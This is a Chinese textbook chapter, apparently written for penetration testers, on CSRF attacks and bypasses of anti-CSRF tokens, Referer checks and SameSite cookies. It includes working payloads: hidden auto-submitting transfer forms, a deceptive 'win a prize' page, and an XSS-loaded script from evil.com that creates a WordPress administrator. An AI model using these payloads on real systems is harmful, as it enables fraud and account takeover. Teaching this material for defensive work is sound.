# 第 5 章 跨站请求伪造攻击

## 5.1 CSRF 漏洞简介

跨站请求伪造（CSRF）允许攻击者伪造请求并以用户身份执行操作。虽然这些操作可以涵盖用户与网站的任何交互——从提交表单、点击链接到执行 API 调用——但要使此攻击产生实际影响，该操作必须是特权操作，例如更改密码、上传文件、删除用户等。这些特权操作通常需要已认证的会话，即用户已成功登录系统。根据攻击的性质和所涉及的具体业务逻辑，这可能最终导致攻击者获得账户控制权甚至执行远程代码。在本章中，我们将深入研究 CSRF 攻击，并探讨可用于利用此漏洞的各种技术。此外，我们还将讨论用于防御 CSRF 攻击的不同防御机制以及可用于规避这些机制的技术。

### 5.1.1 CSRF 如何工作？

要成功实施 CSRF 攻击，必须满足以下条件：

(i) 用户已认证并登录 Web 应用程序，且拥有活动会话。  
(ii) 应用程序中存在特权操作，并且用户拥有执行该操作的权限。  
(iii) 请求中的所有参数都是可预测的，并且对攻击者已知。

我们来看一个银行网站请求的示例。考虑以下从一个账户向另一个账户转账的请求：

**请求**
```
POST /transfer.php HTTP/1.1
Host: vulnerablebank.com
Cookie: PHPSESSID=3e5a8b24b7467fd7e4791ab33412aff1
Content-Type: application/x-www-form-urlencoded

to_account=098855455&amount=1000&currency=usd
```

从这个请求可以清楚地看出，CSRF 攻击的所有三个条件都已满足：

(i) 用户已认证并拥有有效的会话 ID。  
(ii) 特权操作是向账户转账。  
(iii) 该请求的所有参数都是可预测的，并且对攻击者已知。

**图 5.1 存在 CSRF 漏洞的表单**

现在，让我们考虑以下不满足条件的请求：

**请求**
```
POST /transfer.php HTTP/1.1
Host: securebank.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

to_account=987654321&amount=1000&password=password@12345
```

在此请求中，用户已登录银行应用程序，创建了活动会话。用户拥有执行转账的权限，这是一个特权操作。然而，这次银行网站要求每次交易请求中都包含用户的密码作为额外的安全层，这对攻击者来说是不可预测的，因此第三个条件不满足。

**图 5.2 因密码字段而免受 CSRF 攻击的表单**

### 5.1.2 构建 CSRF 有效载荷

基于此，我们可以构建以下 CSRF 有效载荷：

**POC**
```html
<form action="http://vulnerablebank.com/transfer.php" method="POST">
    <input type="hidden" name="to_account" value="123456789" />
    <input type="hidden" name="amount" value="1000" />
    <input type="hidden" name="currency" value="usd" />
    <input type="submit" value="Submit" />
</form>
```

**图 5.3 CSRF 有效载荷示意图**

在此示例中，托管在攻击者控制网站上的表单意图将资金转入攻击者选择的账户。表单由攻击者预先填充，并且类型已设为隐藏，以便受害者在点击提交按钮时不会注意到。

**图 5.4 执行前的 CSRF POC**

### 5.1.3 无需用户交互的 CSRF 有效载荷

前面示例中提到的有效载荷需要用户交互，因为用户必须点击提交按钮才能执行请求。然而，有几种方法可以在后台提交表单。一个例子是使用 JavaScript 中的 `submit()` 函数。我们来看一下实际效果：

**示例 1：使用 document.forms**
```html
<form action="www.vulnerablebank.com/transfer.php" method="POST">
    <input type="hidden" name="to_account" value="123456789" />
    <input type="hidden" name="amount" value="1000" />
    <input type="hidden" name="currency" value="usd" />
</form>
<script>
    document.forms[0].submit();
</script>
```

在此示例中，`document.forms[0]` 引用网页上的第一个表单元素，后面跟 `submit()` 函数，该函数触发表单提交。

还有几种不涉及 script 标签的替代方法。例如，可以使用 img 标签加载不存在的图像，从而触发错误。这与 `onerror` 事件处理程序结合使用，可用于触发表单提交。

**示例 2：替代执行方式**
```html
<form action="www.vulnerablebank.com/transfer.php" method="POST" id="transferForm">
    <input type="hidden" name="to_account" value="8654754" />
    <input type="hidden" name="amount" value="1000" />
    <input type="hidden" name="currency" value="usd" />
    <img src=x onerror="document.getElementById('transferForm').submit();" />
</form>
```

其他几个 HTML 元素可以使用 `onload` 或 `onerror` 事件处理程序来自动提交表单，无需用户交互。

**有效载荷**
```html
<svg/onload="document.getElementById('transferForm').submit();">
<iframe onload="document.getElementById('transferForm').submit();"></iframe>
<body onload="document.getElementById('transferForm').submit();" />
<video src="x" onerror="document.getElementById('transferForm').submit();"></video>
```

### 5.1.4 在 GET 请求中利用 CSRF 有效载荷

虽然在 POST 参数中利用 CSRF 在现实中更常见，但应用程序也可能使用 GET 参数提交表单，因此如果满足 CSRF 条件，也可能容易受到此攻击。最简单的方法是生成一个 GET 请求，并将相关输入参数传递给查询字符串。以下是 `vulnerablebank.com` 的 POC 示例：

**POC**
```html
<img src="www.vulnerablebank.com/transfer.php?to_account=098855455&amount=1000&currency=usd">
```

值得一提的是，有时应用程序也会将 POST 方法表单通过 GET 方法提交；在这种情况下，可以将 POST 请求转换为 GET。

### 5.1.5 CSRF 有效载荷的传递

虽然 IMG 标签在 CSRF 利用中非常常见，但还有几种替代的 HTML 标签可用于传递 CSRF 有效载荷。这些替代标签可以应用于 GET 和 POST 请求。我们来看几个选项：

**Iframe 标签**
```html
<iframe src="www.vulnerablebank.com/transfer.php?to_account=123456789&amount=1000&currency=usd" style="display:none;"></iframe>
```

**Script 标签**
```html
<script src="www.vulnerablebank.com/transfer.php?to_account=123456789&amount=1000&currency=usd"></script>
```

**Link 标签**
```html
<link rel="stylesheet" type="text/css" href="www.vulnerablebank.com/transfer.php?to_account=123456789&amount=1000&currency=usd">
```

## 5.2 利用基于 JSON 的 CSRF

JSON 已成为现代 Web 应用程序最流行的数据交换格式。了解基于 JSON 的 CSRF 攻击的工作原理，由于其在现实中的广泛使用，在渗透测试期间将大有裨益。

在处理涉及 JSON 请求的 CSRF 时，需要考虑一些方面。例如，期望 JSON 数据的 Web 应用程序可能会拒绝查询字符串并将其视为格式错误的请求。因此，JSON 必须正确格式化。让我们探讨几种场景：

### 5.2.1 场景 1：缺少 Content-Type 验证和 JSON 格式化

在此场景中，JSON 解析器既不验证 `Content-Type` 标头，也不检查 POST 数据是否格式正确。同样，它也不会检查 POST 数据中是否存在尾随字符。

为了说明，我们以 `vulnerablebank.com` 为例，但这次 POST 参数以 JSON 格式编码：

**请求**
```
POST /transfer.php HTTP/1.1
Host: www.vulnerablebank.com
Cookie: PHPSESSID=3e5a8b24b7467fd7e4791ab33412aff1
Content-Type: application/json

{
    "to_account": "098855455",
    "amount": "1000",
    "currency": "usd"
}
```

攻击者可以通过发送一个 HTML 表单来利用此漏洞，该表单将 JSON 有效载荷作为参数包含在内，但编码为 `text/plain`。这将允许 JSON 有效载荷无障碍地传递，整个 JSON 有效载荷作为参数名称发送。

**POC：**
```html
<html>
    <form action="http://localhost:9000/CSRF-JSON/transfer.php" method="post" enctype="text/plain">
        <input name='{"to_account":"098855455","amount":"1000","currency":"usd"}' type='hidden'>
        <input type="submit">
    </form>
</html>
```

服务器将收到一个带有空主体的 POST 请求，如下所示：

**图 5.6 发送到服务器之前拦截的 HTTP 请求**

## 5.3 场景 2：Content-Type 未验证，但 JSON 语法被验证

在此场景中，JSON 解析器不验证 `Content-Type` 标头，但会强制执行严格的解析规则。在这种情况下，由于尾随的 `=` 字符，请求将被拒绝。

为了克服此限制，我们在 JSON 有效载荷中添加一个名为 `dummy_param` 的虚拟参数，以确保正确的格式。服务器在处理过程中通常会忽略虚拟参数，从而使 CSRF 攻击可行。

**POC：**
```html
<html>
    <form action="www.vulnerablebank.com/transfer.php" method="post" enctype="text/plain">
        <input name='{"to_account":"098855455","amount":"1000","currency":"usd","dummy_param":"' value='test"}' type='hidden'>
        <input type="submit">
    </form>
</html>
```

## 5.4 场景 3：服务器期望 application/json Content-Type 标头

如果服务器期望请求中包含 `application/json` 内容类型标头，则使用 XHR（XMLHttpRequest）发出的任何跨源请求都将因同源策略（SOP）而被浏览器阻止。

在 HTML5 之前的时代，Flash 和 Silverlight 等技术允许用户通过添加自定义标头来规避此类限制；然而，在现代 Web 应用程序中利用此场景需要寻找 CORS（跨域资源共享）错误配置，这将在 HTML5 章节（第 12 章）中详细介绍。

## 5.6 利用多阶段 CSRF

为涉及单个请求的 CSRF 攻击创建 POC 相对简单。然而，当涉及多个请求时，过程变得复杂，特别是对于状态更改操作，如用户创建/删除或资金转移。

尽管复杂，但有一条规则成立：只要多个阶段中涉及的参数是可预测且一致的，就有可能实施 CSRF 攻击。让我们以 `vulnerablebank` 场景为例，该场景具有多个资金转移阶段。

在我们的场景中，第一阶段涉及提交账户号、金额和货币等详细信息。以下是第一个请求的样子：

**请求**
```
POST /transfer.php HTTP/1.1
Host: vulnerablebank.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: http://vulnerablebank.com
Connection: close
Referer: http://vulnerablebank.com/transfer.php
Cookie: PHPSESSID=99cbdv5bo99hqb42geaq4hfgh9
Upgrade-Insecure-Requests: 1

to_account=098855455&amount=1000&currency=usd
```

**图 5.10 金额转账页面**

提交这些详细信息后，会出现一个确认表单，只有点击“确认”按钮后，交易才会执行。以下是请求的样子：

**请求**
```
POST /confirm.php HTTP/1.1
Host: vulnerablebank.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://vulnerablebank.com/confirm.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Origin: http://vulnerablebank.com
Connection: close
Cookie: PHPSESSID=99cbdv5bo99hqb42geaq4hfgh9
Upgrade-Insecure-Requests: 1
```

**图 5.11 确认页面——成功转账**

基于此，我们可以创建一个 CSRF POC 来模拟转账和确认的两步过程。

**POC**
```html
<h1>Click the button to win a prize!</h1>
<button onclick="winFunc();">Click here to win Prize!</button>

<form id="form1" action="http://vulnerablebank.com/transfer.php" method="POST" target="hiddenIframe">
    <input type="hidden" name="to_account" value="098855455" />
    <input type="hidden" name="amount" value="1000" />
    <input type="hidden" name="currency" value="usd" />
</form>

<form id="form2" action="http://vulnerablebank.com/confirm.php" method="POST" target="hiddenIframe">
</form>

<iframe name="hiddenIframe" style="display:none;"></iframe>

<script>
function winFunc() {
    // Step 1: Initiate the transfer
    document.getElementById('form1').submit();
    // Delay before sending the second request
    setTimeout(function() {
        // Step 2: Confirm the transfer
        document.getElementById('form2').submit();
    }, 3000);
}
</script>
```

POC 被伪装成一个无害的按钮，声称用户会赢得奖品。然而，一旦点击按钮，它会发起两个 POST 请求，分别到 `transfer.php` 和 `confirm.php`。

包含攻击有效载荷的表单 `form1` 和 `form2` 被设置为 `display: none`，并且其目标为隐藏的 iframe，确保受害者在点击按钮时不会注意到任何可疑内容。

`winFunc()` 函数首先提交表单以发起转账，然后等待三秒再提交第二个表单以确认转账。此延迟最小化了在目标网站上发起和确认交易之间可能出现的时间差。此时间是随意的；但可以根据网站实际操作的时间进行调整。

**图 5.12 CSRF 多阶段成功交易**

值得注意的是，相同的多阶段 POC 也可以通过 XHR 和 Fetch API 完成；但是，这些方法将受制于 SOP。在考虑在 CSRF 攻击中使用这些方法时，这是一个关键细节。

## 5.7 利用薄弱的反 CSRF 防御

在前面的示例中，我们展示了 CSRF 攻击如何容易被利用。因此，多年来已经开发、破坏和改进了许多措施和防御机制来防止此攻击。在本节中，我们将深入研究识别和利用薄弱的反 CSRF 措施和实现。

### 5.7.1 CSRF 防御——薄弱/可预测的反 CSRF 令牌

由于 CSRF 攻击能够成功的首要条件是请求中的所有参数都是可预测的并且对攻击者已知，因此最合乎逻辑的防御是以挑战-响应机制的形式向请求添加随机值。这通常被称为反 CSRF 令牌。这意味着此防御的基础在于令牌值经过加密随机化，攻击者无法预测。现代框架通常会生成特定于会话的反 CSRF 令牌，或针对特定用户操作生成。

然后，这些令牌会包含在后续请求中，作为隐藏表单字段、HTTP 标头或 URL 参数的一部分。服务器随后在每个请求上验证令牌，以确认其与会话或特定操作的预期值匹配。

考虑以下示例：表单包含一个随机生成的 `csrf_token`，包含在隐藏参数中。

**请求**
```html
<form action="www.vulnerablebank.com/transfer.php" method="POST">
    <input type="hidden" name="to_account" value="123456789" />
    <input type="hidden" name="amount" value="1000" />
    <input type="hidden" name="currency" value="usd" />
    <input type="hidden" name="csrf_token" value="sx555xasff1asfasv15aa52321DDADSF" />
    <input type="submit" value="Submit" />
</form>
```

以下是说明此操作的序列图：

**图 5.13 演示反 CSRF 令牌的序列图**

虽然现代开发框架已经实现了安全的方法来随机生成和管理反 CSRF 令牌，但仍有一些情况下开发人员选择构建这些令牌的自定义实现，导致令牌值薄弱/可预测。使用可预测值的一个示例是使用用户名和出生日期生成 CSRF 令牌。

### 5.7.2 CSRF 绕过——未验证的 CSRF 令牌

在某些情况下，CSRF 令牌可能是随机生成且加密安全的，但由于实现缺陷，服务器端缺乏验证。让我们看一个来自安全研究员 Prakhar Prasad 发现的漏洞的真实示例。该漏洞存在于 `translate.twitter.com` 功能中，该功能允许用户更新基本账户设置。

以下是执行此操作的请求示例：

**请求**
```
POST /user/update HTTP/1.1
Host: translate.twitter.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 175
Cookie: <cookies>

utf8=✓&_method=put&authenticity_token=B6PJGp2Hkm1zi6lVN/IueNd7QqlAhIfM5C1pht1MzE8=&user[id]=809244&user[badging_exempted]=0&user[receive_badge_email]=0
```

**图 5.14 更新账户设置的 Twitter 功能**

在此请求中，`authenticity_token` 参数包含与请求正文一起发送的反 CSRF 令牌。安全研究员发现，通过从请求中删除 `authenticity_token` 参数并提交，请求仍然成功。此漏洞允许绕过 CSRF 保护。

以下是研究员使用的最终 POC 示例：

**POC**
```html
<body onload=document.getElementById('xsrf').submit()>
    <form id='xsrf' method="post" action="http://translate.twttr.com/user/update">
        <input type='hidden' name='user[badging_exempted]' value='0'></input>
        <input type='hidden' name='user[id]=user[id]' value='809244'></input>
        <input type='hidden' name='user[receive_badge_email]' value='0'></input>
    </form>
</body>
```

在此 POC 中，`<body>` 标签与 `onload` 事件处理程序结合使用，以自动提交表单，无需用户交互。

### 5.7.3 CSRF 绕过——Referer/Origin 检查

由于要利用 CSRF 漏洞，攻击者需要诱使受害者导航到托管 CSRF 有效载荷的网页（例如 `evil.com`）。因此，对易受 CSRF 攻击的目标应用程序的请求将源自攻击者域（`evil.com`）。开发人员实施 Referer/Origin 检查，以确保请求来自白名单源或同源。

Referer 标头提供关于发起请求的先前页面的 URL 的信息，在这种情况下将如下所示：

**示例**
```
Referer: http://evil.com/csrf-poc.html
```

而 Origin 标头提供关于用于发起请求的来源（协议、主机、端口）的信息。其主要用途是用于强制执行跨域资源共享（CORS）策略，允许服务器根据发起域决定是否允许/拒绝请求，但也可能被开发人员用作 CSRF 保护机制。Origin 标头如下所示：

**示例：**
```
Origin: https://evil.com
```

在此示例中，`https` 是协议，`example.com` 是主机，端口隐含为 HTTPS 的默认端口（443），因为未明确提及。

虽然可以使用浏览器扩展和 Web 代理来伪造或重写标头，但在现代应用程序中发起跨源请求时无法设置自定义标头。过去，通过使用 Flash、Silverlight 等插件可以实现这一点，但如今已不再广泛使用，以这种方式操纵标头的能力受到限制。

在现代应用程序中，反向代理和 WAF 可能会移除或修改标头，这可能给 CSRF 检测带来挑战。这可能导致假阴性和假阳性，因为预期的标头可能在请求过程中不存在或已被更改。

此外，在用户从安全站点（HTTPS）导航到非安全站点（HTTP）的场景中，浏览器不会发送 referrer 标头，从而导致不一致。

尽管如此，在某些场景下，根据具体实现，referrer 保护仍然可以被绕过。

### 5.7.4 场景 1：应用程序未正确验证 Referer 标头

在此场景中，应用程序期望每个请求都发送 referrer 标头，在缺少 referrer 标头的情况下，应用程序将允许请求通过。这可以通过使用一个 meta 标签来绕过，该标签指示浏览器在从受害者浏览器发起请求时丢弃 referrer 标头。

**POC**
```html
<body>
    <meta name="referrer" content="never">
    <form action="www.vulnerablebank.com/transfer.php" method="POST">
        <input type="hidden" name="to_account" value="123456789" />
        <input type="hidden" name="amount" value="1000" />
        <input type="hidden" name="currency" value="usd" />
        <input type="submit" value="Submit" />
    </form>
</body>
```

### 5.7.5 场景 2：弱正则表达式用于 Referer/Origin 验证

在此场景中，应用程序实现了弱正则表达式来验证 referrer 标头或 origin 标头。该正则表达式旨在检查 referrer 或 origin 标头中是否存在特定域（例如 `example.com`）。攻击者可以通过创建与白名单域匹配的自己域的子域来利用此漏洞。

假设应用程序将域 `example.com` 列入白名单，攻击者可以创建一个子域，如 `example.com.evil.com`。此子域将通过弱正则表达式验证，从而允许攻击者绕过 referrer 保护机制。

**示例**
```
example.com.evil.com
```

### 5.7.6 场景 3：基于子域的 Referer 验证绕过

在此场景中，应用程序根据 referrer 标头执行域验证。然而，如果验证不严格并且允许包含子域，则可以利用子域接管来绕过验证。

通过利用被入侵的子域，攻击者可以构造在 referrer 标头中包含该子域的请求，从而欺骗应用程序将请求视为合法。

## 5.8 场景 4：Referer 标头的不一致处理

某些应用程序可能在不同组件、网页甚至单个表单之间对 referrer 标头的处理不一致。攻击者可能通过诱使受害者从没有 referrer 标头的页面导航到绕过 referrer 验证的易受攻击页面，从而利用这种不一致性。

### 5.8.1 通过 XSS 绕过 CSRF 防御

在存在 XSS 漏洞的情况下，大多数 CSRF 防御措施（包括反 CSRF 令牌、referrer、SameSite Cookie 和 Origin 标头检查）都可以被绕过。一种仍然有效的策略是在敏感操作上进行重新认证。

为了说明这一点，让我们看一个现实场景，其中 XSS 如何被武器化以绕过 CSRF 防御。我们将探讨 CVE-2021-24488，这是 WordPress 插件 Post Grid 2.1.1 中的一个反射型 XSS 漏洞 [www.exploit-db.com/exploits/50705]。

该 CVE 的详细信息指出，`tab` 和 `keyword` 参数容易受到 XSS 漏洞的影响。

**POC：**
```
/wp-admin/edit.php?post_type=post_grid&page=post-grid-settings&tab="><script>alert(1)</script>
/wp-admin/edit.php?post_type=post_grid&page=import_layouts&keyword="onmouseover=alert(1)//
```

WordPress 包含一个名为 `wpnonce` 的反 CSRF 令牌，作为隐藏输入字段存在于网页响应中。该令牌针对特定用户和特定操作（例如向 WordPress 添加用户）唯一生成。

**图 5.15 CSRF 令牌（_wpnonce_create-user）**

这里的目标是利用 XSS 漏洞加载一个 JavaScript 代码，该代码将在管理员用户的上下文中执行。该代码将动态提取反 CSRF 令牌 `wpnonce` 的值，并将其插入到用于创建新用户的请求中。以下代码用于实现此目的：

**csrf.js 代码**
```javascript
fetch("http://vulnerablebank.com/wp-admin/user-new.php")
    .then(response => response.text()) // Step 1
    .then(body => {
        const doc = new DOMParser().parseFromString(body, "text/html");
        const _wpnonce_create_user_value = doc.getElementById("_wpnonce_create-user").value; // Step 2
        const formData = new URLSearchParams();
        formData.append("action", "createuser"); // Step 3
        formData.append("_wpnonce_create-user", _wpnonce_create_user_value);
        formData.append("_wp_http_referer", "%2Fwordpress%2Fwp-admin%2Fuser-new.php");
        formData.append("user_login", "hacked");
        formData.append("email", "hacked@test.com");
        formData.append("first_name", "test");
        formData.append("last_name", "hacked");
        formData.append("url", "");
        formData.append("pass1", "hacked");
        formData.append("pass2", "hacked");
        formData.append("pw_weak", "on");
        formData.append("role", "administrator");
        formData.append("createuser", "Add+New+User");
        return fetch("http://vulnerablebank.com/wp-admin/user-new.php", { // Step 4
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Referer": "http://vulnerablebank.com/wp-admin/user-new.php"
            },
            body: formData,
        });
    });
```

以下是 `csrf.js` 代码的逐步分解：

1. 使用 `fetch API`，代码通过 GET 请求异步获取网页的完整响应，包括 CSRF 令牌（即 `wp_nonce` 令牌）。
2. 收到页面响应后，代码使用 `DOMParser` 对象提取反 CSRF 令牌 `wpnonce-create-user` 的值。
3. 接下来，代码构造一个 `formData` 对象，其中包含在 WordPress 上创建新用户所需的所有信息。这包括用户名、电子邮件、密码以及设置为 `administrator` 的角色。
4. 最后，它使用 `FormData` 对象发送一个用于创建新用户的 POST 请求。

根据同源策略（SOP），加载外部 JavaScript 是允许的，因此可以使用 `Script` 标签执行 `csrf.js`。由于请求在同一源内执行，它不受 SOP 的约束。

**POC**
```
http://vulnerabledomain.com/wp-admin/edit.php?post_type=post_grid&page=post-grid-settings&tab="><script src=http://evil.com/csrf/csrf.js></script>
```

在管理员会话上下文中执行此脚本后，将创建一个新用户。

## 5.9 SameSite Cookie

SameSite Cookie 是 Web 标准中相对较新的一个属性。SameSite Cookie 实际上是一种浏览器安全控制，用于决定何时发送 Cookie。如果正确实施，它可以非常有效地防御 CSRF。

从更宏观的角度来看，CSRF 攻击的条件之一是用户已认证并拥有活动会话。会话使用会话 Cookie 进行管理和跟踪。当 CSRF 有效载荷在受害者浏览器中从 `evil.com` 执行时，如果浏览器决定不发送 Cookie，攻击将失败。

让我们看三个属性：

**SameSite Strict**——如果 SameSite 属性设置为 `strict`，则表示 Cookie 不会随跨站请求发送。如果 `www.vulnerablebank.com` 使用的 Cookie 将 SameSite 属性设置为 `strict`，那么这些 Cookie 将不会随 `evil.com` 或其他任何跨源上的恶意表单发起的请求发送。

**图 5.18 SameSite "strict" 标志的实现**

为了更好地理解这一点，让我们考虑之前的 `vulnerablebank.com` CSRF 示例，其中 SameSite 标志已设置为 `strict`。

**图 5.19 由于 strict 标志导致 Cookie 被拒绝**

由于 PHPSESSID Cookie 不会被发送到 `vulnerablebank.com`，因此将被重定向到登录页面。

**图 5.20 未能发送会话令牌时的重定向**

### 5.9.1 SameSite Strict 绕过

绕过 SameSite Cookie 的方法之一是利用应用程序中现有的功能，通常称为“gadgets”。这些 gadgets 可以有多种形式，如客户端 URL 重定向、JSONP 端点或错误配置的 CORS。

为了说明，考虑我们传统的 `vulnerablebank` CSRF 场景。以下请求发起转账：

**POC**
```
http://vulnerablebank.com/transfer.php?to_account=098855455&amount=1000&currency=usd
```

同一个域 `vulnerablebank.com` 包含一段处理基于 URL 中 `redirect` 参数值的客户端重定向的 JavaScript 代码。由于缺乏验证，该代码容易受到“开放重定向”漏洞的影响。

**易受攻击的代码**
```javascript
var params = new URLSearchParams(window.location.search);
var redirectURL = params.get('redirect');
if (redirectURL) {
    window.location = decodeURIComponent(redirectURL);
}
```

在此场景中，被利用的“gadget”是客户端重定向功能。攻击者可以滥用此功能来创建恶意 URL。我们来看以下 POC：

**POC**
```
http://vulnerablebank.com/csrf/index.html?redirect=/transfer.php?to_account=098855455&amount=1000&currency=usd
```

访问此 URL 后，重定向函数被执行，从而发起转账并成功绕过 SameSite Cookie 保护。由于此操作发生在同一域内，Cookie 被发送。

**图 5.21 通过 XSS 绕过 SameSite Strict**

### 5.9.2 通过子域绕过 SameSite Strict

如前所述，当 Cookie 的 SameSite 属性设置为 `Strict` 时，Cookie 将不会随跨源请求发送。但是，如果 Cookie 的作用域没有精确定义，而是设置为 `Domain=vulnerablebank.com`，则该 Cookie 可以被 `vulnerablebank.com` 的所有子域访问。

让我们通过一个示例进一步说明，其中攻击者设法控制了从 `sub1.vulnerablebank.com` 发起的请求。这种控制可以通过 XSS 漏洞或利用子域接管漏洞获得。

在这种情况下，如果从 `sub1.vulnerablebank.com` 向另一个子域（例如 `sub2.vulnerablebank.com`）发出请求，浏览器将在请求中包含 Cookie。这是因为 `sub2.vulnerablebank.com` 是 `vulnerablebank.com` 的子域，因此该请求不被视为跨站。因此，它不受 `SameSite=Strict` 属性施加的限制。

### 5.9.3 SameSite Lax

如果 SameSite 设置为 `Lax`，浏览器会在同站请求和跨站顶级导航（地址栏更改，如用户点击链接或按钮）时发送 Cookie。这里的关键点是，SameSite=Lax 的 Cookie 不会包含在从外部站点通过 POST 请求发送的表单发起的请求中。但是，安全方法（如 GET）是允许的。

### 5.9.4 SameSite Lax 绕过

以传统的 `vulnerablebank.com` 为例，如果会话 Cookie 设置为 `SameSite=Lax`，使用来自外部站点的 POST 请求的典型 POC 将不会成功，因为会话 Cookie 不会被包含：

**代码**
```html
<form action="www.vulnerablebank.com/transfer.php" method="POST">
    <input type="hidden" name="to_account" value="123456789" />
    <input type="hidden" name="amount" value="1000" />
    <input type="hidden" name="currency" value="usd" />
    <input type="submit" value="Submit" />
</form>
```

然而，在某些情况下，由于向后兼容性或开发人员的疏忽，服务器可能具有允许通过 GET 发送请求的配置和覆盖设置。

**POC**
```html
<a href="www.vulnerablebank.com/transfer.php?to_account=123456789&amount=1000&currency=usd">Click here to get a free coupon!</a>
```

执行此 POC 后，尽管 SameSite 设置为 `Lax`，请求仍然被执行：

**图 5.22 通过重定向绕过 CSRF SameSite Lax**

### 5.9.5 SameSite None

当 SameSite 属性设置为 `none` 时，表示 Cookie 将在同站和跨站请求以及跨域通信中发送。换句话说，它不提供任何针对 CSRF 攻击的保护。它通常用于需要跨源访问的场景，例如单点登录（SSO）实现。

## 5.10 额外进阶

- **利用文件上传功能**：研究在存在 CSRF 漏洞的情况下，文件上传功能如何被利用。
- **SameSite 绕过**：探索 PortSwigger 实验室关于 SameSite 绕过的内容。同时研究可用于绕过 "SameSite Strict" 标志的其他 gadgets 列表。
- **双重 Cookie 提交**：某些服务器选择使用双重提交 Cookie 方法来验证请求以防止 CSRF。研究此技术以了解如何用于防御 CSRF 攻击，并探讨会话固定如何可能被用来绕过此保护。
